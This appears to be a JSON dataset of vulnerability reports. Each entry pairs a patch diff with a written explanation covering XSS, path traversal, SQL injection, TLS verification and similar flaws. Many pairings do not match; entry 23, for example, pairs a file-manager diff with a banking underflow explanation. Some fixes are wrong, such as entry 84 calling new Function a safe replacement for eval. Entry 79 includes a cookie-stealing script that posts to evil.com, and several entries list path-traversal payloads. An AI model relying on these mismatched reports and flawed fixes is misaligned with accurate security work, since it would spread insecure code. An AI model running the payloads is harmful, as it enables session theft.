        "diff": "--- original_script.py\n+++ fixed_script.py\n@@ -1,7 +1,9\n import os\n import re\n import sys\n \n-errors_encounter = 0\n+errors_encounter = 0\n\n+def is_valid_file_path(file_path):\n+    # Check if the file path is within the allowed directory\n+    base_dir = \"/allowed/directory\"\n+    abs_path = os.path.abspath(file_path)\n+    return abs_path.startswith(base_dir)\n \n pattern = re.compile(\n     r\"_\\(([\\\"']{,3})(?P<message>((?!\\1).)*)\\1(\\s*,\\s*context\\s*=\\s*([\\\"'])(?P<py_context>((?!\\5).)*)\\5)*(\\s*,(\\s*?.*?\\n*?)*(,\\s*([\\\"'])(?P<js_context>((?!\\11).)*)\\11)*)*\\)\"\n )\n words_pattern = re.compile(r\"_{1,2}\\([\\\"'`]{1,3}.*?[a-zA-Z]\")\n start_pattern = re.compile(r\"_{1,2}\\([f\\\"'`]{1,3}\")\n f_string_pattern = re.compile(r\"_\\(f[\\\"']\")\n starts_with_f_pattern = re.compile(r\"_\\(f\")\n\n # skip first argument\n files = sys.argv[1:]\n files_to_scan = [_file for _file in files if _file.endswith((\".py\", \".js\"))]\n\n for _file in files_to_scan:\n+    if not is_valid_file_path(_file):\n+        print(f\"Invalid file path: {_file}\")\n+        continue\n     with open(_file) as f:\n         print(f\"Checking: {_file}\")\n         file_lines = f.readlines()\n         for line_number, line in enumerate(file_lines, 1):\n             if \"frappe-lint: disable-translate\" in line:\n                 continue\n",
        "explanation": "Explanation:\nThe function addToCart(id, qty) assumes that the id passed is always valid and within the range of the foods list. However, if an invalid id (e.g., 0 or greater than length of foods) is passed, it will raise an IndexError and crash the program.\n\nPOC:\nInputting an invalid food id such as 0 or 999999 when adding to cart will cause an unhandled exception leading to crashing the program or denial of service.\n\nRoot Cause:\nLine 96 in main.py.\n\nmyCart.append(Cart(foods[id -1].name, foods[id -1].price, qty))\n\nNo boundary check on id.\n\nExploit Scenario:\nA user or attacker can input an invalid menu number such as greater then the food quantity or negative entries to crash the program.\n\nWhy it Happens:\nNo validation is done on the id parameter before accessing the list as compared with the length of foods.\n\nSecurity Implications:\nDenial of service by crashing the program. The potential crash will lead to service interruptions.\n\nSuggested Fix:\nAdd validation to ensure id is within valid range before accessing foods.\n\ndef addToCart(id, qty):\n    if id < 1 or id > len(foods):\n        raise ValueError(\"Invalid food ID\")\n    myCart.append(Cart(foods[id - 1].name, foods[id - 1].price, qty))\n\n"
    },
    "40": {
        "diff": "diff --git a/routes/user.js b/routes/user.js\n--- a/routes/user.js\n+++ b/routes/user.js\n@@ -9,6 +9,14 @@\n const path = require('path')\n const excel = require(\"./excel\")\n const mime = require('mime')\n+const rateLimit = require('express-rate-limit');\n+\n+const attendanceLimiter = rateLimit({\n+  windowMs: 15 * 60 * 1000, // 15 minutes\n+  max: 100, // Limit each IP to 100 requests per window\n+  standardHeaders: true, // Enable RateLimit headers\n+  legacyHeaders: false, // Disable deprecated X-RateLimit headers\n+});\n \n //The route to get all the user in the datadase\n router.get(\"/\", auth,async (req, res) => {\n@@ -173,7 +181,7 @@\n })\n \n //to get all the attendance in excel format\n-router.get('/getallattendance', auth,async (req,res)=>{\n+router.get('/getallattendance', auth, attendanceLimiter, async (req,res)=>{\n try {\n //the following are required to get the attendance\n let {month,year,date,serviceType} = req.query",
        "explanation": "Root Cause: The Next.js server improperly trusts the x-middleware-subrequest header, allowing external requests to mimic internal middleware subrequests and bypass authorization checks.\n\nExploit Scenario: An attacker crafts an HTTP request with the x-middleware-subrequest header set. The server treats it as an internal middleware call, skipping authentication/authorization logic, granting unauthorized access to protected routes.\n\nWhy It Happens: Next.js versions in the affected range fail to validate whether the x-middleware-subrequest header originates from legitimate internal middleware processes, enabling external header spoofing.\n\nSecurity Implications: Attackers can exploit this to access restricted endpoints, sensitive data, or administrative functionality, leading to data leaks, privilege escalation, or system compromise.\n\nSuggested Fix: Upgrade the next package to a patched version (e.g., 13.5.9+) or implement a reverse proxy/edge layer to strip the x-middleware-subrequest header from external requests before reaching the Next.js app."
    },
    "23": {
        "diff": "--- old.py      2025-04-24 19:31:18.247783995 +0530\n+++ new.py      2025-04-24 19:31:32.267787221 +0530\n@@ -13,6 +13,7 @@\n import os\n import shutil\n import send2trash\n+import subprocess\n\n print('Welcome to the python-file-manager\\n')\n\n@@ -78,7 +79,7 @@\n\n             if res in os.listdir(os.getcwd()):\n                 if os.path.isfile(res):\n-                    os.system('\"' + res + '\"')\n+                    subprocess.run(['open', filename], shell=True)\n                 else:\n                     os.chdir(res)\n\n",
        "explanation": "Root Cause\nThe vulnerability arises because the code takes user-supplied withdrawal amounts from standard input and feeds them directly into an integer subtraction operation (it.balance - withdrawal_amount) without any validation or overflow checks, allowing the signed integer to wrap around when its result underflows the type\u2019s minimum bound.\n\nExploit Scenario\nAn attacker could input an excessively large withdrawal amount\u2014either larger than the current balance or near the negative limit of the int type\u2014causing the subtraction to wrap the signed integer underflow, yielding a large positive balance that bypasses \u201cinsufficient funds\u201d checks and enables unauthorized withdrawals.\n\nWhy It Happens\nBecause the implementation uses plain signed int for balance and omits any pre-operation bounds validation, the subtraction operation does not guard against underflow; when the result is less than INT_MIN, it wraps around per two\u2019s-complement arithmetic, producing an incorrect positive or negative value.\nSecurity Implications\nIf exploited, this underflow can artificially inflate an account\u2019s balance, allowing attackers to withdraw far more funds than they possess, potentially leading to financial loss, data corruption, denial of service through application crashes, or further privilege escalation within banking operations.\n\nSuggested Fix\nValidate withdrawal inputs to ensure they are non-negative and do not exceed the current account balance before performing the subtraction; incorporate explicit underflow checks (e.g., verify withdrawal_amount <= it.balance and that it.balance - withdrawal_amount >= std::numeric_limits<int>::min()), or use safe-integer wrappers or wider types (such as int64_t or arbitrary-precision libraries) that signal an error on overflow, thereby preventing wraparound and enforcing correct business logic."
    },
    "12": {
        "diff": "--- a/header.php\n+++ b/header.php\n@@\n-<title><?php echo $_SERVER[\"HTTP_HOST\"] ?> :: Pimcore</title>\n+<title><?php echo htmlspecialchars($_SERVER[\"HTTP_HOST\"], ENT_QUOTES, 'UTF-8') ?> :: Pimcore</title>\n",
        "explanation": "Vulnerability Type:CWE-79: Improper Neutralization of Input During Web Page Generation \nThis vulnerability allows attackers to inject malicious scripts into web content viewed by other users.\n\nProof of Concept:\nIn the WebSSH project, the following line is vulnerable:\n\nstatus.html(text.split('\\n').join('<br/>'));\n\nThis line reflects unsanitized user input directly into the HTML of the page. If the text variable contains a string like <script>alert('XSS')</script>, it will be executed in the user\u2019s browser.\n\nSolution:\nSanitize user input by escaping special HTML characters before inserting it into the DOM:\n\nstatus.html(\n  text\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#039;')\n    .split('\\n')\n    .join('<br/>')\n);\n\nSeverity:\nMedium \u2014 This vulnerability allows client-side code execution and can lead to session hijacking or phishing.\n\nRoot Cause:\nThe code directly injects user-controlled input into the DOM using .html() without validating or escaping HTML characters, allowing script injection.\n\nExploit Scenario:\nAn attacker crafts a URL like http://<url>/?hostname=<script>alert('XSS')</script> and sends it to a victim. When the victim opens it, the script executes in their browser.\n\nWhy It Happens:\nThe application assumes user input is safe and injects it into the webpage using .html() without sanitization, leading to script execution.\n\nSecurity Implications:\nIf exploited, an attacker can execute JavaScript in the victim\u2019s browser, steal session cookies, impersonate users, or redirect to malicious pages.\n\nSuggested Fix:\nAlways sanitize or escape user input before inserting it into the DOM. Avoid using .html() with untrusted input and consider using .text() or an HTML escape function."
    },
    "15": {
        "diff": "--- a/common_filters.py\n+++ b/common_filters.py\n@@ class CommonFilters:\n\n     @staticmethod\n     def set_owner(filters, module, key):\n         if not module or not filters or not key:\n             return None\n\n         if request.method == 'POST':\n             if current_user.is_admin:\n                 if filters.assignees.data:\n-                    owner = text('%s.owner_id=%d' % (module, filters.assignees.data.id))\n+                    from sqlalchemy import and_\n+                    owner = and_(module.c.owner_id == filters.assignees.data.id)\n                     session[key] = filters.assignees.data.id\n                 else:\n                     session.pop(key, None)\n                     owner = True\n             else:\n-                owner = text('%s.owner_id=%d' % (module, current_user.id))\n+                from sqlalchemy import and_\n+                owner = and_(module.c.owner_id == current_user.id)\n                 session[key] = current_user.id\n         else:\n             if key in session:\n-                owner = text('%s.owner_id=%d' % (module, session[key]))\n+                from sqlalchemy import and_\n+                owner = and_(module.c.owner_id == session[key])\n                 filters.assignees.data = User.get_by_id(session[key])\n             else:\n-                owner = True if current_user.is_admin else text('%s.owner_id=%d' % (module, current_user.id))\n+                owner = True if current_user.is_admin else and_(module.c.owner_id == current_user.id)\n         return owner\n\n     @staticmethod\n     def set_accounts(filters, module, key):\n         if not module or not filters or not key:\n             return None\n\n         account = True\n         if request.method == 'POST':\n             if filters.accounts.data:\n-                account = text('%s.account_id=%d' % (module, filters.accounts.data.id))\n+                from sqlalchemy import and_\n+                account = and_(module.c.account_id == filters.accounts.data.id)\n                 session[key] = filters.accounts.data.id\n             else:\n                 session.pop(key, None)\n         else:\n             if key in session:\n-                account = text('%s.account_id=%d' % (module, session[key]))\n+                from sqlalchemy import and_\n+                account = and_(module.c.account_id == session[key])\n                 filters.accounts.data = Account.get_account(session[key])\n         return account\n\n     @staticmethod\n     def set_contacts(filters, module, key):\n         if not module or not filters or not key:\n             return None\n\n         contact = True\n         if request.method == 'POST':\n             if filters.contacts.data:\n-                contact = text('%s.contact_id=%d' % (module, filters.contacts.data.id))\n+                from sqlalchemy import and_\n+                contact = and_(module.c.contact_id == filters.contacts.data.id)\n                 session[key] = filters.contacts.data.id\n             else:\n                 session.pop(key, None)\n         else:\n             if key in session:\n-                contact = text('%s.contact_id=%d' % (module, session[key]))\n+                from sqlalchemy import and_\n+                contact = and_(module.c.contact_id == session[key])\n                 filters.contacts.data = Contact.get_contact(session[key])\n         return contact\n",
        "explanation": "Vulnerability Type : CWE-248 Uncaught Exception. This type of vulnerability is caused because of not checking for exceptions at runtime.\n\nProof of Concept: The code from index.js has no code for handling exceptions-\n\napp.use(bodyParser.json());\n\napp.use(\"/people\", usersRoutes);\napp.get(\"/\", (req, res) => res.send(\"Welcome to the Users API!\"));\napp.all(\"*\", (req, res) =>res.send(\"You've tried reaching a route that doesn't exist.\"));\n\nWithout a global error handler, Express will not catch it, and the application may crash, especially in production environments.\n \nSeverity: 5/5. This is because this vulnerability can cause the application to crash in production and thus make it unavailable for other users to use (DoS).\n\nRoot cause: The vulnerability is caused by the absence of a global error-handling middleware in the Express app. Without it, any unexpected error thrown during request processing remains uncaught and can crash the Node.js process.\n\nExploit scenario: An attacker sends a specially crafted request to a route that lacks internal error handling. For instance, accessing /crash or triggering a TypeError will cause the app to throw an exception. Without a global handler, the server process crashes, making the service unavailable to all users.\n\nWhy it happens: The Express app is missing the built-in global error-handling middleware, which is needed to catch exceptions that aren\u2019t handled locally in the routes. This is a design flaw \u2014 all Express apps should have a fallback error handler.\n\nSecurity implications: If this vulnerability is exploited, the server can crash completely, resulting in downtime. In some cases, stack traces may be exposed to the client, revealing internal paths or sensitive information about the app's structure.\n\nSuggested Fix: This can be fixed by using adding a global error handler at the end of the middleware stack-\n\napp.use((err, req, res, next) => {\n  console.error(err.stack);\n  res.status(500).send('Something went wrong!');\n});"
    },
    "79": {
        "diff": "--- original_file.php\t2025-04-27\n+++ fixed_file.php\t2025-04-27\n@@\n $safe_base_dir = '/var/www/uploads/'; // Define a safe base directory\n $real_path = realpath($safe_base_dir . '/' . basename($path));\n\n if ($real_path === false || strpos($real_path, $safe_base_dir) !== 0) {\n     die('Invalid file path!');\n }\n\n if (!file_put_contents($real_path, $contents)) {\n     // error handling\n }\n",
        "explanation": "[Detail Report in DOC format attached in ZIP File]\nVulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nProof of Concept:\nVulnerable Code Sections:\n$('.js-widget-list').append(data);\n$('.dashboardViewContainer').html(data);\nfilteridSelectDOM.empty().html(res).trigger('change');\nfieldsSelectDOM.empty().html(fieldsHTML).trigger('change');\nStep-by-Step Explanation:\n1.\tdata, res, fieldsHTML \u2014 all originate from user-controlled or external sources (server responses, request parameters).\n2.\tThe code injects raw HTML into the page DOM using .append() and .html().\n3.\tIf an attacker can control data or res (even partially), they could inject malicious <script> tags.\n4.\tThis leads to arbitrary JavaScript execution inside the victim\u2019s browser \u2014 a stored or reflected XSS.\nExample Payload:\n<script>alert('XSS by attacker')</script>\nInjected via any widget title, server response, or malicious widget configuration.\nSeverity:\nCritical (Stored or Reflected XSS = full session hijacking risk)\nRoot Cause:\nThe application directly renders unsanitized HTML content (data, res, fieldsHTML) into the DOM without escaping HTML entities or validating the source of the data.\nThis allows malicious input to be executed as JavaScript in the browser.\nExploit Scenario:\nAn attacker uploads or edits a widget to include a payload like:\n<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>\nWhen any legitimate user loads the dashboard, the browser executes the malicious JavaScript, causing:\n\u2022\tSession hijacking\n\u2022\tAccount takeover\n\u2022\tPotential complete control over the application from the victim's side.\nWhy It Happens:\nBecause dangerous methods (.html(), .append()) are used without escaping, encoding, or sanitization of the inserted content, making it possible for attackers to inject executable scripts into the page.\nSecurity Implications:\nIf exploited, the attacker can:\n\u2022\tHijack user sessions (including admin)\n\u2022\tDeface the dashboard\n\u2022\tSteal sensitive information\n\u2022\tLaunch further attacks from trusted user accounts (Stored XSS persists)\nSuggested Fix:\n--- DashBoard.js\t2025-04-27\n+++ DashBoard_fixed.js\t2025-04-27\n@@\n- $('.js-widget-list').append(data);\n+ $('.js-widget-list').append(DOMPurify.sanitize(data));\n\n- $('.dashboardViewContainer').html(data);\n+ $('.dashboardViewContainer').html(DOMPurify.sanitize(data));\n\n- filteridSelectDOM.empty().html(res).trigger('change');\n+ filteridSelectDOM.empty().html(DOMPurify.sanitize(res)).trigger('change');\n\n- fieldsSelectDOM.empty().html(fieldsHTML).trigger('change');\n+ fieldsSelectDOM.empty().html(DOMPurify.sanitize(fieldsHTML)).trigger('change');\n//must include the DOMPurify library in your project for this patch."
    },
    "46": {
        "diff": "--- app.py      2025-04-25 18:41:19.701652995 +0530\n+++ app-new.py      2025-04-25 18:41:07.821712930 +0530\n@@ -654,39 +654,44 @@\n     db = get_db()\n     rst = db.cursor().execute(\n         '''\n-        with Shop_Name(TID, S_name) as (\n-                select TID, S_name\n-                from Transaction_Record left join Stores\n-                on T_Object = S_owner\n-            ),\n-            Subj_Name(TID, Subj_name) as (\n-                select TID, U_name as Subj_name\n-                from Transaction_Record, Users\n-                where T_Subject = UID\n-            ),\n-            Obj_Name(TID, Obj_name) as (\n-                select TID, U_name as Obj_name\n-                from Transaction_Record, Users\n-                where T_Object = UID\n-            )\n-        select TID,\n-            case\n-                when T_action = 2 then 'Recharge'\n-                when T_action = 1 then 'Recieve'\n-                when T_action = 0 then 'Payment'\n-            end as Action,\n-            strftime('%Y/%m/%d %H:%M', T_time) as Time,\n-            case\n-                when T_action = 2 then Subj_name\n-                when T_action = 1 and is_refund = 0 then Obj_name\n-                when T_action = 1 and is_refund = 1 then S_name\n-                when T_action = 0 and is_refund = 0 then S_name\n-                when T_action = 0 and is_refund = 1 then Obj_name\n-            end as Trader,\n+        WITH Shop_Name(TID, S_name) AS (\n+            SELECT TID, S_name\n+            FROM Transaction_Record LEFT JOIN Stores\n+            ON T_Object = S_owner\n+        ),\n+        Subj_Name(TID, Subj_name) AS (\n+            SELECT TID, U_name AS Subj_name\n+            FROM Transaction_Record\n+            INNER JOIN Users ON Transaction_Record.T_Subject = Users.UID\n+            WHERE Users.UID = ?\n+        ),\n+        Obj_Name(TID, Obj_name) AS (\n+            SELECT TID, U_name AS Obj_name\n+            FROM Transaction_Record\n+            INNER JOIN Users ON Transaction_Record.T_Object = Users.UID\n+            WHERE Users.UID = ?\n+        )\n+        SELECT TID,\n+            CASE\n+                WHEN T_action = 2 THEN 'Recharge'\n+                WHEN T_action = 1 THEN 'Recieve'\n+                WHEN T_action = 0 THEN 'Payment'\n+            END AS Action,\n+            strftime('%Y/%m/%d %H:%M', T_time) AS Time,\n+            CASE\n+                WHEN T_action = 2 THEN Subj_name\n+                WHEN T_action = 1 AND is_refund = 0 THEN Obj_name\n+                WHEN T_action = 1 AND is_refund = 1 THEN S_name\n+                WHEN T_action = 0 AND is_refund = 0 THEN S_name\n+                WHEN T_action = 0 AND is_refund = 1 THEN Obj_name\n+            END AS Trader,\n             T_amount\n-        from Transaction_Record natural join Subj_Name natural join Obj_Name natural join Shop_Name\n-        where T_Subject = ?\n-        ''', (UID,)\n+        FROM Transaction_Record\n+        NATURAL JOIN Subj_Name\n+        NATURAL JOIN Obj_Name\n+        NATURAL JOIN Shop_Name\n+        WHERE T_Subject = ?\n+        ''', (UID, UID, UID)  # Pass UID as parameter to each subquery\n     ).fetchall()\n     transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}\n                    for TID, Action, Time, Trader, T_amount in rst]",
        "explanation": "Vulnerability Type: CWE-23: Path Traversal\nProof of Concept:\nwith open(_file) as f:\nStep-by-Step Explanation:\nThe above line of code attempts to open a file based on user input (_file), which is passed as a command-line argument. If an attacker provides a specially crafted file path containing directory traversal sequences (e.g., ../../etc/passwd or ..\\\\..\\\\windows\\\\system32), the open() function will open unintended files outside of the intended directory. This could lead to unauthorized access or modification of system files.\nSeverity:\nHigh\nThe severity is high because the vulnerability could allow an attacker to access sensitive files on the system, potentially leading to further exploitation, such as unauthorized reading, modification, or deletion of critical files.\nRoot Cause:\nThe vulnerability arises from using unvalidated user input (the file paths) directly in the open() function. Without proper checks or sanitization, an attacker can manipulate the file path to include directory traversal sequences, allowing them to escape the intended directory and access system-critical files.\nExploit Scenario:\nAn attacker could provide a path like ../../../../etc/passwd or ..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam as one of the command-line arguments. If this input is used without sanitization in the open() function, the attacker could read system files like /etc/passwd or Windows' system files, which could contain sensitive information such as user credentials.\nThis could also be used as a vector for more sophisticated attacks, such as reading configuration files to gain further insights into the system, or even modifying sensitive files.\nWhy It Happens:\nThis vulnerability happens because the code directly passes user-supplied file names to the open() function without performing any sanitization or validation of the file paths. Path traversal vulnerabilities are common when user input is not strictly validated or filtered for potentially dangerous characters like ../.\n\n\nSecurity Implications:\nExploiting this vulnerability could allow an attacker to access or manipulate system files, leading to a breach of confidentiality or integrity. In the worst-case scenario, this could lead to full system compromise, data leakage, or loss of data, depending on the system's configuration and the files an attacker is able to access. The attacker could also use this information to escalate their privileges on the system.\nSuggested Fix:\n--- original_script.py\n+++ fixed_script.py\n@@ -1,7 +1,9\n import os\n import re\n import sys\n \n-errors_encounter = 0\n+errors_encounter = 0\n\n+def is_valid_file_path(file_path):\n+    # Check if the file path is within the allowed directory\n+    base_dir = \"/allowed/directory\"\n+    abs_path = os.path.abspath(file_path)\n+    return abs_path.startswith(base_dir)\n \n pattern = re.compile(\n     r\"_\\(([\\\"']{,3})(?P<message>((?!\\1).)*)\\1(\\s*,\\s*context\\s*=\\s*([\\\"'])(?P<py_context>((?!\\5).)*)\\5)*(\\s*,(\\s*?.*?\\n*?)*(,\\s*([\\\"'])(?P<js_context>((?!\\11).)*)\\11)*)*\\)\"\n )\n words_pattern = re.compile(r\"_{1,2}\\([\\\"'`]{1,3}.*?[a-zA-Z]\")\n start_pattern = re.compile(r\"_{1,2}\\([f\\\"'`]{1,3}\")\n f_string_pattern = re.compile(r\"_\\(f[\\\"']\")\n starts_with_f_pattern = re.compile(r\"_\\(f\")\n\n # skip first argument\n files = sys.argv[1:]\n files_to_scan = [_file for _file in files if _file.endswith((\".py\", \".js\"))]\n\n for _file in files_to_scan:\n+    if not is_valid_file_path(_file):\n+        print(f\"Invalid file path: {_file}\")\n+        continue\n     with open(_file) as f:\n         print(f\"Checking: {_file}\")\n         file_lines = f.readlines()\n         for line_number, line in enumerate(file_lines, 1):\n             if \"frappe-lint: disable-translate\" in line:\n                 continue\n\u2022\tSanitizing Input: A function is_valid_file_path(file_path) is introduced to check if the provided file path starts with an allowed directory (in this case, /allowed/directory).\n\u2022\tValidation Before Opening: Before opening any file, the script now verifies that the file path is valid using is_valid_file_path(_file). If the path is invalid, it skips that file and prints a message indicating the invalid file path.\n\n"
    },
    "70": {
        "diff": "diff --git a/Pipfile b/Pipfile\n--- a/Pipfile\n+++ b/Pipfile\n@@ -7,7 +7,7 @@\n name = \"pypi\"\n \n [packages]\n-django = \"==5.1\"\n+django = \"==5.1.4\"\n psycopg2-binary = \"==2.9.9\"\n dj-database-url = \"==2.2.0\"\n djangorestframework = \"==3.15.2\"\n gunicorn = \"==23.0.0\"",
        "explanation": "Vulnerability Type: CWE-353: Missing Support for Integrity Check\n\nProof of Concept:\nThe following HTML tag loads an external script without the integrity attribute:\n\nxml\n<script src=\"https://code.jquery.com/jquery-3.6.0.js\"></script>\n\nWithout integrity, the browser cannot verify if the file has been tampered with. An attacker who compromises the CDN or intercepts the connection could inject malicious code, which would then execute in the user's browser.\nSolution:\nAlways include the integrity and crossorigin attributes to ensure the browser only executes the expected file:\n\nxml\n<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" integrity=\"sha384-H+K7U5CnXl1h5ywQ+z3l9P7l6N9t4UHVX0EBaL7Y5nVwE9x4IYm9OV2w5a0Z8XFx\" crossorigin=\"anonymous\"></script>\n\nThis ensures the browser checks the downloaded file's hash against the expected value and refuses to execute it if it doesn't match.\n\nSeverity: LOW\n\nRoot Cause:\nThe root cause of this vulnerability is the omission of integrity check mechanisms-such as the integrity attribute for HTML subresources or checksums in protocols-when loading external resources or transmitting data. Without these mechanisms, the application cannot verify whether the fetched or transmitted data has been tampered with by unauthorized parties. This oversight often stems from developers\u2019 overreliance on trusted sources (like popular CDNs or HTTPS) and a lack of rigorous threat modeling, leading them to skip implementing explicit integrity validation. As a result, there is no way to determine if data or resources have been corrupted or maliciously altered during transmission or at the source, exposing the application to supply chain and man-in-the-middle attacks\n\nExploit Scenario:\nIf an attacker gains access to the CDN or performs a man-in-the-middle attack, they can modify the external script to include malicious code. When a user loads the page, their browser downloads and executes the altered script, potentially resulting in session hijacking, credential theft, or malware installation.\n\nWhy It Happens:\nDevelopers often trust reputable CDNs and assume HTTPS is sufficient for security. However, without the integrity attribute, the browser cannot detect if the file has been maliciously altered in transit or at the source. This design flaw leaves a critical gap in the security of externally loaded resources.\n\nSecurity Implications:\nThe absence of integrity checks exposes applications to significant security risks. Attackers can exploit this weakness by injecting malicious code into external scripts or stylesheets, or by tampering with data during transmission. If a remote resource is altered-either through a compromised CDN or a man-in-the-middle attack-users may unknowingly execute harmful scripts, leading to cross-site scripting (XSS), session hijacking, data breaches, or the installation of malware. This can compromise the confidentiality, integrity, and availability of both user data and the web application itself, potentially resulting in unauthorized information disclosure, command injection, reputational damage, and even compromise of the entire deployment pipeline.\n\nSuggested Fix:\nAlways specify the integrity and crossorigin attributes when including third-party scripts or stylesheets. The integrity attribute should contain a cryptographic hash (e.g., SHA-384) of the expected file, ensuring the browser only executes resources that match the specified hash. This practice significantly reduces the risk of supply chain attacks and unauthorized code execution"
    },
    "84": {
        "diff": "diff --git a/input.js b/input.js\nindex 5f2d8ab..7f3c0c1 100644\n--- a/input.js\n+++ b/input.js\n@@ -58,10 +58,15 @@\n module.exports.evalExtendOutputFn = (input) => {\n     let extendOutputFunction;\n     if (typeof input.extendOutputFunction === 'string' && input.extendOutputFunction.trim() !== '') {\n         try {\n-            // eslint-disable-next-line no-eval\n-            extendOutputFunction = eval(input.extendOutputFunction);\n+            // PATCH: Replace eval with safer new Function to prevent code injection\n+            extendOutputFunction = new Function(`return (${input.extendOutputFunction})`)();\n         } catch (e) {\n             throw new Error(`WRONG INPUT: 'extendOutputFunction' is not valid Javascript! Error: ${e}`);\n         }\n         if (typeof extendOutputFunction !== 'function') {\n             throw new Error(\n                 'WRONG INPUT: extendOutputFunction is not a function! Please fix it or use just default ouput!',\n             );\n         }\n     }\n     return extendOutputFunction;\n };\n",
        "explanation": "Vulnerability Type:\nCWE-295: Improper Certificate Validation\nCWE-297: Improper Validation of Certificate with Hostname Mismatch\nThe code disables both server certificate verification and hostname checking, leading to full SSL/TLS connection compromise.\n\nProof of Concept:\nIn the _open_connection method, the following unsafe code disables SSL verification:\n\nif self.pipeline.settings.SSL_SKIP_VERIFY:\n    ssl_context.check_hostname = False\n    ssl_context.verify_mode = ssl.CERT_NONE\n\nThis disables both:\nCertificate trust chain validation (CWE-295)\nHostname matching between certificate and server (CWE-297)\n\nIf an attacker sets up a fake server with any certificate, the client would trust it and connect without any warning.\n\nSeverity:\nCritical\nBoth server certificate validation and hostname verification are turned off, allowing total interception and modification of secure communications (MITM attack).\nThe server identity can be forged, and the connection is fully compromised.\n\nRoot Cause:\nThe code explicitly disables ssl_context.check_hostname and sets ssl_context.verify_mode = ssl.CERT_NONE if SSL_SKIP_VERIFY is enabled.\nThis behavior completely disables the purpose of SSL/TLS \u2014 to guarantee the identity and authenticity of the server.\n\nExploit Scenario:\nAn attacker on the same network could perform a man-in-the-middle (MITM) attack by impersonating the intended server using a self-signed certificate.\nSince the client does not validate the server\u2019s certificate nor hostname, the attacker could steal sensitive data like passwords, session tokens, or inject malicious responses without the user's knowledge.\n\nExample steps:\nSet up a fake server at the same IP.\nPresent a fake certificate.\nClient connects without warnings.\nAttacker reads or modifies all traffic.\n\nWhy It Happens:\nThe system incorrectly assumes it is safe to disable certificate validation and hostname checking based on a configuration flag (SSL_SKIP_VERIFY).\nSSL/TLS security depends entirely on validating the server\u2019s identity, and skipping it nullifies the protection.\n\nSecurity Implications:\nIf exploited, an attacker can:\nSteal login credentials and sensitive session data.\nModify the data being sent or received (MITM).\nInject malware into client responses.\nMaintain persistent access to confidential communications.\n\nThis completely undermines the confidentiality and integrity of the application\u2019s communication channel, potentially causing widespread damage and data breaches.\n\nSuggested Fix:\nAlways enforce server certificate validation and hostname verification.\nDo not allow ssl_context.check_hostname to be disabled.\nDo not allow ssl_context.verify_mode to be set to ssl.CERT_NONE.\n\nSafe Code:\n\nssl_context = ssl.create_default_context()\n# Never disable hostname verification or trust validation\n\nIf disabling validation is ever necessary (for local testing), it must be strictly separated from production code and require explicit acknowledgment."
    },
    "48": {
        "diff": "diff --git a/shop.py b/shop.py\nindex 7a8b9c0..d4e5f6a 100644\n--- a/shop.py\n+++ b/shop.py\n@@ -29,4 +29,7 @@ def showMyCart():\n     # existing cart display logic...\n \n-def addToCart(id,qty):\n-    myCart.append(Cart(foods[id -1].name, foods[id -1].price, qty))\n+def addToCart(id, qty):\n+    # validate the food ID\n+    if id < 1 or id > len(foods):\n+        raise ValueError(\"Invalid food ID\")\n+    myCart.append(Cart(foods[id - 1].name, foods[id - 1].price, qty))\n",
        "explanation": "Explanation:\nThe provided Python Tkinter code handles order management by reading from and writing to text files based on user input. The code lacks input validation and proper file handling safeguards, which can lead to security issues such as arbitrary file manipulation, injection attacks, and data corruption.\n\nPOC:\nEntering a specially crafted order string containing newline characters or path traversal sequences (e.g., ../../somefile) in the entry widget can cause unintended file writes or deletions.\nFor example, entering ../../etc/passwd and submitting an order could potentially write to or remove lines from system files if the application runs with sufficient privileges.\n\nRoot Cause:\nLine 27-34 in kitchen_app.py (complete_order function): Writes user input directly to \"completed_orders.txt\" and removes matching lines from \"started_orders.txt\" without sanitization.\n\nentered_order = entry.get()\nwith open(\"completed_orders.txt\", \"a\") as f:\n    f.write(entered_order + \"\\n\")\n...\nif value_to_remove not in line:\n    file.write(line)\n\nExploit Scenario:\nAn attacker or malicious user can input crafted strings to manipulate the file system, such as injecting newline characters to add extra lines, or path traversal sequences to affect files outside the intended directory. This can lead to data loss, unauthorized file modification, or denial of service by corrupting order files.\n\nWhy it Happens:\nLack of input validation or sanitization on user inputs before writing to or modifying files.\nDirect use of user input in file operations without restricting or validating content.\nNo error handling around file I/O operations.\nUse of global mutable state (entered_order) unnecessarily complicates control flow and state management.\n\nSecurity Implications:\nArbitrary file write and deletion could lead to data corruption or loss.\nPotential for path traversal attacks if file paths are dynamically constructed (less likely here but still a risk if code evolves).\nInjection of malicious content into order files could affect downstream processing.\n\nSuggested Fix:\nValidate and sanitize all user inputs to allow only expected characters (e.g., alphanumeric, spaces).\nAvoid using global variables for user input; pass parameters explicitly.\nAdd error handling for file operations.\nFollowing is the patched function:\n\nimport re\n\ndef sanitize_order(order):\n    # Allow only alphanumeric and basic punctuation, strip leading/trailing spaces\n    sanitized = re.sub(r'[^a-zA-Z0-9\\s.,-]', '', order).strip()\n    return sanitized\n\ndef complete_order():\n    order = entry.get()\n    sanitized_order = sanitize_order(order)\n    if not sanitized_order:\n        print(\"Invalid order input.\")\n        return\n\n    try:\n        with open(\"completed_orders.txt\", \"a\") as f:\n            f.write(sanitized_order + \"\\n\")\n\n        file_name = \"started_orders.txt\"\n        with open(file_name, \"r\") as file:\n            lines = file.readlines()\n\n        with open(file_name, \"w\") as file:\n            for line in lines:\n                if sanitized_order not in line:\n                    file.write(line)\n    except IOError as e:\n        print(f\"File operation failed: {e}\")\n\n"
    },
    "83": {
        "diff": "diff --git a/packages/auth/src/lib/useFromRedirect.ts b/packages/auth/src/lib/useFromRedirect.ts\nindex b3a2d22..c1b57f9 100644\n--- a/packages/auth/src/lib/useFromRedirect.ts\n+++ b/packages/auth/src/lib/useFromRedirect.ts\n@@\n-import { useMemo } from 'react'\n-\n-// TODO: remove or fix\n-export function useRedirect() {\n-  return useMemo(() => '/', [])\n-}\n+// Safe redirect hook - no dynamic behavior\n+export function useRedirect() {\n+  return '/';\n+}\n",
